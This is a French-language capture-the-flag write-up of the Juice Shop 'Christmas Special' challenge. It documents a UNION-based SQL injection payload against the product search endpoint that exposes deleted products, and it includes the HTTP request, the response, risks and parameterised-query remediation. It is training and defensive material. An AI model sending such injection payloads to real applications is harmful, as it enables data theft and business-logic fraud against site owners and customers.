# Christmas Special

> **Category :** Injection  
> **Difficulty :** 3  

## Methodology

1. **Recherche de faille**
   - Technique : Énumération, Test d'injection
   - Outil : BurpSuite (Proxy, Repeater)
   - Description : Interception des requêtes via BurpSuite pour analyser le endpoint de recherche `/rest/products/search?q=`. Test avec `banana'` pour vérifier la vulnérabilité à l'injection SQL.

2. **Exploitation de la faille**
   - Technique : Injection SQL (UNION-based)
   - Outil : BurpSuite, Navigateur
   - Description : Injection d'une requête UNION SELECT pour récupérer tous les produits de la base de données, y compris ceux marqués comme supprimés (deletedAt non null). Identification du produit "Christmas Super-Surprise-Box" (id=10) puis ajout au panier en modifiant l'ID du produit dans la requête.

| Partie | Rôle |
|--------|------|
| `apple'))` | Ferme la requête originale (chaîne + doubles parenthèses) |
| `UNION SELECT` | Ajoute une nouvelle requête SELECT à la requête originale |
| `* FROM Products` | Sélectionne toutes les colonnes de la table Products, incluant les produits supprimés |
| `--` | Commente le reste de la requête originale pour l'ignorer |

## Vulnerabilities

**Vulnerability :** Injection SQL - Accès à des données supprimées / Contournement de la logique métier

**Components :** Base de données, Système de recherche de produits, Panier

**Severity level :** Critique

## Risks

- Exfiltration de données sensibles (emails, mots de passe hashés, adresses, tokens de paiement)
- Énumération complète de la structure de la base de données
- Contournement de l'authentification via extraction des identifiants administrateur
- Achat de produits normalement indisponibles ou à prix modifié
- Manipulation ou suppression potentielle des données

## Actions

**Risks mitigation strategies :**
- Appliquer le principe du moindre privilège pour le compte de base de données (permissions SELECT uniquement pour les fonctions de recherche)
- Implémenter une validation stricte des entrées utilisateur (longueur, caractères autorisés)

**Remediation fixes :**
Utiliser des requêtes paramétrées (Prepared Statements) :
```javascript
const query = "SELECT * FROM Products WHERE name LIKE ? AND deletedAt IS NULL";
db.all(query, ['%' + req.query.q + '%'], callback);
```

**Security practice :**
- Ne jamais concaténer les entrées utilisateur dans les requêtes SQL
- Vérifier côté serveur que les produits ajoutés au panier sont bien disponibles
- Effectuer des tests de pénétration réguliers sur les fonctionnalités de recherche

## Evidences and artifacts

**Request :**
```http
GET /rest/products/search?q=banana'))%20UNION%20SELECT%20*%20FROM%20Products-- HTTP/2
Host: ctf.juice.cyber.epitest.eu
```

**Response :**
```json
{
    "status":"success",
    "data":[
        { 
            "id":10,
            "name":"Christmas Super-Surprise-Box (2014 Edition)",
            "description":"Contains a random selection of 10 bottles...",
            "price":29.99,
            "deletedAt":"2025-12-15 13:55:59.553 +00:00"
        }
    ]
}
```
